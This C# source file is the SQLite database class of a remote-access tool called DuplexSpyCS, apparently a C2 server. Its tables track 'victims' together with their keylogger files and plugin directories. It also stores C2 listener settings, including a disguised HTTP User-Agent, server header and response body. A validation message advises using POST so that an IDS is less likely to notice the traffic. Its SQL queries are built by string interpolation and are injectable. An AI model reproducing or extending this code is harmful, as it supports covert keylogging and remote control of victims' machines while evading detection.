using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.Data;
using System.Data.Entity.Migrations.Model;
using System.Xml.Linq;
using System.Globalization;

namespace DuplexSpyCS
{
    public class clsSqlConn
    {
        //LOG EVENT
        public delegate void NewVictimEventHandler(clsVictim v, string os, string host);
        public event NewVictimEventHandler NewVictimEvent;

        public delegate void SystemEventHandler(string msg); //System log event handler.
        public event SystemEventHandler NewSystemLogs;
        public delegate void KeyExchangeEventHandler(clsVictim v, string msg); //Key exchange log event handler.
        public event KeyExchangeEventHandler NewKeyExchangeLogs;
        public delegate void SendFunctionEventHandler(clsVictim v, string msg); //Send function log event handler.
        public event SendFunctionEventHandler NewSendFunctionLogs;
        public delegate void ErrorEventHandler(string msg); //Error log event handler.
        public event ErrorEventHandler NewErrorLogs;

        /// <summary>
        /// Defined the structure of SQLite database.
        /// The keys of dictionary represent tables.
        /// The string array represent columns of each table.
        /// </summary>
        private Dictionary<string, string[]> dic_tables = new Dictionary<string, string[]>()
        {
            { 
                "Logs", new string[]
                {
                    "CSV",        //CLIENT, SERVER OR VICTIM. VALUE: C(CLIENT, FOR C2 VERSION), S(SERVER), V(VICTIM).
                    "Type",       //SYSTEM, KEY EXCHANGE, SEND FUNCTION OR ERROR.
                    "OnlineID",   //ONLINE ID
                    "RemoteOS",   //OS VERSION
                    "Func",       //FUNCTION THAT OCCURED ERROR OR SOMETHING
                    "Message",    //DETAIL MESSAGE,
                    "CreateDate", //LOG CRAETION DATE
                }
            },
            {
                //ADD ITEM FOR EVERY ONLINE, WHATEVER IT EVER EXIST IN DATABASE.
                "Victim", new string[]
                {
                    "OnlineID",       //VICTIM ID.
                    "Dir",            //VICTIM DIRECTORY IN HACKER'S SERVER.
                    "OS",             //VICITM OS
                    "KLF",            //KEY LOGGER FILE OF VICTIM IN REMOTE.
                    "PD",             //PLUGIN DIRECTORY.
                    "CreateDate",     //CREATION DATE.
                    "LastOnlineDate", //LAST ONLINE DATE.
                    "Uptime",         //UPTIME.
                }
            },
            {
                "Listener", new string[]
                {
                    "Name",         //LISTENER'S NAME.
                    "Protocol",     //TCP, UDP, HTTP
                    "Port",         //LISTENER'S PORT.
                    "Description",  //LISTENER'S DESCRIPTION.
                    "CreationDate", //LISTENER'S CREATION DATE.

                    "CertPath",
                    "CertPassword",
                    
                    "HttpHost",
                    "HttpMethod",
                    "HttpPath",
                    "HttpUA",

                    "HttpStatus", //HTTP response status code.
                    "HttpServer", //HTTP response server.
                    "HttpContentType", //HTTP response content-type.
                    "HttpBody", //Default HTTP response body.
                }
            }
        };

        public enum CSV
        {
            Client,
            Server,
            Victim,
        };
        public enum MsgType
        {
            System,
            KeyExchange,
            Function,
            Error,
        };

        public string ConnectionString { get; set; } //SQL DATABASE CONNECTION STRING
        public string DatabasePath { get; set; } //SQL DATABASE FILE

        private SQLiteConnection sql_conn;

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="db_file"></param>
        public clsSqlConn(string db_file)
        {
            if (!File.Exists(db_file))
            {
                DialogResult dr = MessageBox.Show(
                    $"Cannot find database file: {db_file}\n" +
                    $"Do you want to open exists file?\n" +
                    $"Click \"No\" to create a new database file.",
                    "File not exists",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning,
                    MessageBoxDefaultButton.Button2
                    );

                if (dr == DialogResult.Yes)
                {
                    OpenFileDialog ofd = new OpenFileDialog();
                    if (ofd.ShowDialog() == DialogResult.Yes)
                    {
                        db_file = ofd.FileName;
                    }
                }
            }

            DatabasePath = db_file;
            ConnectionString = $"Data Source={db_file};Compress=True;";

            if (sql_conn == null || !File.Exists(db_file))
            {
                //IF DB FILE DOES NOT EXIST, THEN IT WILL CREATE A NEW ONE.
                sql_conn = new SQLiteConnection(ConnectionString);

                if (!File.Exists(db_file))
                {
                    Db_Init();
                }
            }
        }

        /// <summary>
        /// Open SQL database.
        /// </summary>
        /// <returns></returns>
        public int Open()
        {
            try
            {
                if (sql_conn == null)
                    return 0;

                sql_conn.Open();
                return 1;
            }
            catch (Exception ex)
            {
                return 0;
            }
        }

        /// <summary>
        /// CLose SQL database.
        /// </summary>
        /// <returns></returns>
        public int Close()
        {
            if (sql_conn == null)
                return 0;

            try
            {
                sql_conn.Close();
                return 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return 0;
            }
        }

        /// <summary>
        /// SQL database initialization.
        /// </summary>
        /// <returns></returns>
        private int Db_Init()
        {
            if (sql_conn == null)
                return 0;

            try
            {
                Open(); //OPEN DATABASE
                foreach (string table in dic_tables.Keys) //CREATE TABLE
                    CreateTable(table);

                return 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 0;
            }
        }

        /// <summary>
        /// Create table base on specified key in dictionary.
        /// </summary>
        /// <param name="table_name">Key in dictionary.</param>
        /// <returns></returns>
        private int CreateTable(string table_name)
        {
            if (!PassTypicalError())
                return 0;

            string col_query = string.Join(", ", dic_tables[table_name].Select(x => $"{x} TEXT").ToArray());
            string sql = $"CREATE TABLE {table_name} ({col_query});";
            if (SqlNoOutput(sql) == 0)
                return 0;

            return 1;
        }

        /// <summary>
        /// Detect typical error in SQL connection.
        /// </summary>
        /// <returns>True: Pass, False: Exists error</returns>
        private bool PassTypicalError()
        {
            try
            {
                if (sql_conn == null)
                    throw new Exception("SQL Connection is null.");
                if (sql_conn.State == ConnectionState.Closed)
                    throw new Exception("SQL database state is closed.");

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        /// <summary>
        /// Execute a SQL query but do not return SQL result.
        /// </summary>
        /// <param name="sql">SQL query string</param>
        /// <returns>Check execution success.</returns>
        public int SqlNoOutput(string sql)
        {
            try
            {
                if (!PassTypicalError())
                    return 0;

                using (SQLiteCommand cmd = new SQLiteCommand(sql, sql_conn))
                {
                    cmd.CommandText = sql;
                    cmd.ExecuteNonQuery();
                    return 1;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 0;
            }
        }

        /// <summary>
        /// Execute a SQL query string.
        /// </summary>
        /// <param name="sql">SQL query string</param>
        /// <returns>Return SQL output result.</returns>
        public DataTable GetDataTable(string sql)
        {
            DataTable dt = new DataTable();

            try
            {
                if (!PassTypicalError())
                    return dt;
                
                using (var data_adapter = new SQLiteDataAdapter(sql, sql_conn))
                {
                    DataSet ds = new DataSet();
                    data_adapter.Fill(ds);

                    if (ds.Tables.Count > 0)
                        dt = ds.Tables[0];
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "GetDataTable()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            return dt;
        }
        public DataTable fnQuery(string szQuery) => GetDataTable(szQuery);

        public string[] SqlStrArray(string sql)
        {
            DataTable dt = GetDataTable(sql);
            object[] objs = dt.Rows[0].ItemArray;

            return objs.Select(x => x.ToString()).ToArray();
        }

        /// <summary>
        /// Add new victim data into database and print
        /// </summary>
        /// <param name="v"></param>
        /// <param name="os"></param>
        /// <param name="host"></param>
        /// <returns></returns>
        public (int, string) NewVictim(clsVictim v, string os, string host)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                DataTable dt = GetDataTable($"SELECT EXISTS(SELECT 1 FROM Victim WHERE OnlineID = \"{v.ID}\")");
                DataRow dr = dt.Rows[0];
                long qwExists = (long)dr[0];

                string szDate = clsTools.DateTimeStrEnglish();

                if (qwExists == 0) //Not exists
                {

                    SqlNoOutput("INSERT INTO Victim(\"OnlineID\",\"Dir\",\"OS\",\"KLF\",\"PD\",\"CreateDate\",\"LastOnlineDate\")VALUES (" +
                        $"\"{v.ID}\"," + //Online ID.
                        $"\"{v.dir_victim}\"," + //Victim directory.
                        $"\"{os}\"," + //OS.
                        $"\"{"keylogger.rtf"}\"," + //Keylogger file.
                        $"\"NULL\"," + //Plugin directory.
                        $"\"{szDate}\"," + //Create date.
                        $"\"{szDate}\"" + //Last online date.
                        ")");
                }
                else //Exists
                {
                    SqlNoOutput($"UPDATE Victim SET LastOnlineDate = \"{szDate}\" WHERE OnlineID = \"{v.ID}\"");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "NewVictim()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                code = 0;
            }

            return (code, msg);
        }

        /// <summary>
        /// Add new log.
        /// </summary>
        /// <param name="csv">Client/Server/Victim</param>
        /// <param name="msg_type">Message type(System, Key exchange, Send function, Error)</param>
        /// <param name="msg">Message string content.</param>
        /// <returns>Return code.</returns>
        public int NewLogs(CSV csv, MsgType msg_type, string msg)
        {
            try
            {
                string sql_query = $"INSERT INTO Logs(\"CSV\",\"Type\",\"Message\",\"CreateDate\") VALUES (" +
                    $"\"{csv}\"," +
                    $"\"{msg_type}\"," +
                    $"\"{msg}\"," +
                    $"\"{DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")}\"" +
                    $")";
                SqlNoOutput(sql_query);

                switch (msg_type)
                {
                    case MsgType.System:
                        msg = $"[{clsTools.DateTimeStrEnglish()}]: {msg}";
                        if (NewSystemLogs != null)
                            NewSystemLogs(msg);
                        break;
                    case MsgType.Error:
                        msg = $"[{clsTools.DateTimeStrEnglish()}]: {msg}";
                        if (NewErrorLogs != null)
                            NewErrorLogs(msg); 
                        break;
                }

                return 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "NewLogs()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 0;
            }
        }
        public int NewLogs(CSV csv, MsgType msg_type, string function, string msg)
        {
            try
            {
                string sql_query = $"INSERT INTO Logs(\"CSV\",\"Type\",\"Func\",\"Message\",\"CreateDate\") VALUES (" +
                    $"\"{csv}\"," +
                    $"\"{msg_type}\"," +
                    $"\"{function}\"," +
                    $"\"{msg}\"," +
                    $"\"{DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")}\"" +
                    $")";
                SqlNoOutput(sql_query);

                switch (msg_type)
                {
                    case MsgType.System:
                        msg = $"[{clsTools.DateTimeStrEnglish()}]: {msg}";
                        if (NewSystemLogs != null)
                            NewSystemLogs(msg);
                        break;
                    case MsgType.Error:
                        msg = $"[{clsTools.DateTimeStrEnglish()}]: {msg}";
                        if (NewErrorLogs != null)
                            NewErrorLogs(msg);
                        break;
                }

                return 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "NewLogs(+4)", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 0;
            }
        }
        public int NewVictimLogs(MsgType msg_type, clsVictim v, string msg)
        {
            try
            {
                string sql_query = $"INSERT INTO Logs(\"CSV\",\"Type\",\"OnlineID\",\"RemoteOS\",\"Message\",\"CreateDate\") VALUES (" +
                    $"\"{CSV.Victim}\"," + //CSV
                    $"\"{msg_type}\"," + //Type
                    $"\"{v.ID}\"," + //ID
                    $"\"{v.remoteOS}\"," + //Remote OS
                    $"\"{msg}\"," + //Message
                    $"\"{clsTools.DateTimeStrEnglish()}\"" + //Create Date
                    $")";

                SqlNoOutput(sql_query);

                switch (msg_type)
                {
                    case MsgType.KeyExchange:
                        if (NewKeyExchangeLogs != null)
                            NewKeyExchangeLogs(v, msg);
                        break;
                    case MsgType.Function:
                        if (NewSendFunctionLogs != null)
                            NewSendFunctionLogs(v, msg);
                        break;
                    case MsgType.Error:
                        msg = $"[{v.ID}]: {msg}";
                        if (NewErrorLogs != null)
                            NewErrorLogs(msg);
                        break;
                }

                return 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "NewVictimLogs()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 0;
            }
        }

        public void WriteSystemLogs(string msg)
        {
            NewLogs(CSV.Server, MsgType.System, msg);
        }
        public void WriteKeyExchange(clsVictim v, string msg)
        {
            NewVictimLogs(MsgType.KeyExchange, v, msg);
        }
        public void WriteSendLogs(clsVictim v, string msg)
        {
            NewVictimLogs(MsgType.Function, v, msg);
        }
        public void WriteErrorLogs(clsVictim v, string msg)
        {
            NewVictimLogs(MsgType.Error, v, msg);
        }

        public void WriteSysErrorLogs(string msg)
        {
            NewLogs(CSV.Server, MsgType.Error, msg);
        }
        public void WriteSysErrorLogs(string function, string msg)
        {
            NewLogs(CSV.Server, MsgType.Error, function, msg);
        }

        public bool ClearLogs()
        {
            try
            {
                SqlNoOutput("DELETE FROM \"Logs\";");

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ClearLogs()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        #region Listener

        public stListenerConfig fnGetListener(string szName)
        {
            if (fnbListenerExists(szName))
            {
                var ls = fnlsGetAllListener();
                foreach (var l in ls)
                {
                    if (string.Equals(l.szName, szName))
                        return l;
                }

                return new stListenerConfig();
            }
            else
            {
                MessageBox.Show("Listener not exists: " + szName, "fnGetListener()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return new stListenerConfig();
            }
        }

        public List<stListenerConfig> fnlsGetAllListener()
        {
            List<stListenerConfig> lListener = new List<stListenerConfig>();
            string szQuery = $"SELECT * FROM \"Listener\";";
            DataTable dt = GetDataTable(szQuery);
            foreach (DataRow dr in dt.Rows)
            {
                stListenerConfig config = new stListenerConfig()
                {
                    szName         = (string)dr["Name"],
                    enProtocol     = (enListenerProtocol)Enum.Parse(typeof(enListenerProtocol), (string)dr["Protocol"]),
                    nPort          = int.Parse((string)dr["Port"]),
                    szDescription  = (string)dr["Description"],
                    dtCreationDate = DateTime.Parse((string)dr["CreationDate"]),

                    szCertPath = (string)dr["CertPath"],
                    szCertPassword = (string)dr["CertPassword"],

                    szHttpHost = (string)dr["HttpHost"],
                    httpMethod = (enHttpMethod)Enum.Parse(typeof(enHttpMethod), (string)dr["HttpMethod"]),
                    szHttpPath = (string)dr["HttpPath"],
                    szHttpUA = (string)dr["HttpUA"],

                    szStatus = (string)dr["HttpStatus"],
                    szServer = (string)dr["HttpServer"],
                    szContentType = (string)dr["HttpContentType"],
                    szBody = (string)dr["HttpBody"],
                };

                lListener.Add(config);
            }

            return lListener;
        }

        public bool fnbListenerExists(string szName)
        {
            try
            {
                string szQuery = $"SELECT EXISTS(SELECT 1 FROM \"Listener\" WHERE \"Name\" = \"{szName}\");";
                DataTable dt = GetDataTable(szQuery);

                return (Int64)dt.Rows[0][0] == (Int64)1;
            }
            catch (Exception ex)
            {
                return false;
            }
        }
        public bool fnbListenerEqual(stListenerConfig config, string szName)
        {
            try
            {
                stListenerConfig stCheckConfig = fnGetListener(szName);
                return (
                    Equals(stCheckConfig.enProtocol, config.enProtocol) &&
                    Equals(stCheckConfig.szDescription, config.szDescription) &&
                    Equals(stCheckConfig.nPort, config.nPort) &&
                    
                    Equals(stCheckConfig.szCertPath, config.szCertPath) &&
                    Equals(stCheckConfig.szCertPassword, config.szCertPassword) &&

                    Equals(stCheckConfig.httpMethod, config.httpMethod) &&
                    Equals(stCheckConfig.szHttpHost, config.szHttpHost) &&
                    Equals(stCheckConfig.szHttpPath, config.szHttpPath) &&
                    Equals(stCheckConfig.szHttpUA, config.szHttpUA) &&
                    
                    Equals(stCheckConfig.szStatus, config.szStatus) &&
                    Equals(stCheckConfig.szServer, config.szServer) &&
                    Equals(stCheckConfig.szContentType, config.szContentType) &&
                    Equals(stCheckConfig.szBody, config.szBody)
                );
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbListenerEqual()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        private bool fnbSaveListenerValidate(stListenerConfig config)
        {
            if (string.IsNullOrEmpty(config.szName))
                throw new Exception("Listener name cannot be null or empty.");

            if (config.nPort < 0)
                throw new Exception("Listener port cannot be less than zero.");

            var ls = fnlsGetAllListener();
            foreach (var l in ls)
            {
                if (int.Equals(config.nPort, l.nPort) && !string.Equals(config.szName, l.szName))
                    throw new Exception($"Port[{config.nPort}] is assigned for Listener[{l.szName}]");
            }

            if (config.enProtocol == enListenerProtocol.TLS)
            {
                if (string.IsNullOrEmpty(config.szCertPath))
                    throw new Exception("Certificate path is null or empty.");

                if (!File.Exists(config.szCertPath))
                    throw new Exception("Cannot find certificate file: " + config.szCertPath);

                if (string.IsNullOrEmpty(config.szCertPassword))
                    MessageBox.Show("You certificate password is null or empty. It might cause security issues, but the server still runs.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            else if (config.enProtocol == enListenerProtocol.HTTP)
            {
                if (config.httpMethod == enHttpMethod.GET)
                    MessageBox.Show(
                        "HTTP GET is specified. Current version constructs the HTTP packet with appending the message to the HTTP request body.\n" +
                        "The IDS (Intrusive Detection System) or packet analyzer might notice this abnormal HTTP request packet format.\n" +
                        "HTTP POST method is recommended.",
                        "Warning",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning
                    );

                if (string.IsNullOrEmpty(config.szHttpPath))
                    MessageBox.Show("You HTTP resource path is null or empty.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                if (string.IsNullOrEmpty(config.szContentType))
                    MessageBox.Show("Content-Type is null or empty.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                if (string.IsNullOrEmpty(config.szHttpUA))
                    MessageBox.Show("User-Agent is null or empty.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                if (string.IsNullOrEmpty(config.szHttpHost))
                    MessageBox.Show("HTTP host is null or empty.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                if (string.IsNullOrEmpty(config.szBody))
                    MessageBox.Show("HTTP response body is null or empty.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            else
            {
                throw new Exception($"Unknown protocol: {config.enProtocol.ToString()}");
            }

            return true;
        }

        public bool fnbSaveListener(stListenerConfig config)
        {
            try
            {
                if (!fnbSaveListenerValidate(config))
                    return false;

                string szQuery = string.Empty;
                if (fnbListenerExists(config.szName))
                {
                    szQuery = $"UPDATE \"Listener\" SET " +
                        $"\"Protocol\"=\"{config.enProtocol}\"," +
                        $"\"Port\"=\"{config.nPort}\"," +
                        $"\"Description\"=\"{config.szDescription}\"," +
                        $"\"CreationDate\"=\"{config.dtCreationDate.ToString("yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture)}\"," +
                        
                        $"\"CertPath\"=\"{config.szCertPath}\"," +
                        $"\"CertPassword\"=\"{config.szCertPassword}\"," +
                        
                        $"\"HttpHost\"=\"{config.szHttpHost}\"," +
                        $"\"HttpMethod\"=\"{Enum.GetName(config.httpMethod)}\"," +
                        $"\"HttpPath\"=\"{config.szHttpPath}\"," +
                        $"\"HttpUA\"=\"{config.szHttpUA}\"," +

                        $"\"HttpStatus\"=\"{config.szStatus}\"," +
                        $"\"HttpServer\"=\"{config.szServer}\"," +
                        $"\"HttpContentType\"=\"{config.szContentType}\"," +
                        $"\"HttpBody\"=\"{config.szBody}\" " +
                        
                        $"WHERE \"Name\"=\"{config.szName}\";";
                }
                else
                {
                    szQuery = $"INSERT INTO \"Listener\" VALUES " +
                        $"(" +
                        $"\"{config.szName}\"," +
                        $"\"{config.enProtocol}\"," +
                        $"\"{config.nPort} \"," +
                        $"\"{config.szDescription}\"," +
                        $"\"{config.dtCreationDate.ToString("yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture)}\"," +
                        
                        $"\"{config.szCertPath}\"," +
                        $"\"{config.szCertPassword}\"," +

                        $"\"{config.szHttpHost}\"," +
                        $"\"{Enum.GetName(config.httpMethod)}\"," +
                        $"\"{config.szHttpPath}\"," +
                        $"\"{config.szHttpUA}\"," +

                        $"\"{config.szStatus}\"," +
                        $"\"{config.szServer}\"," +
                        $"\"{config.szContentType}\"," +
                        $"\"{config.szBody}\"" +

                        $");";
                }

                GetDataTable(szQuery);

                return fnbListenerEqual(config, config.szName);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbSaveListener()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        public bool fnbDeleteListener(string szName)
        {
            if (!fnbListenerExists(szName))
            {
                MessageBox.Show("Cannot find listener: " + szName, "fnbDeleteListener()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            string szQuery = $"DELETE FROM \"Listener\" WHERE \"Name\"=\"{szName}\";";
            GetDataTable(szQuery);

            return !fnbListenerExists(szName);
        }

        #endregion
    }
}
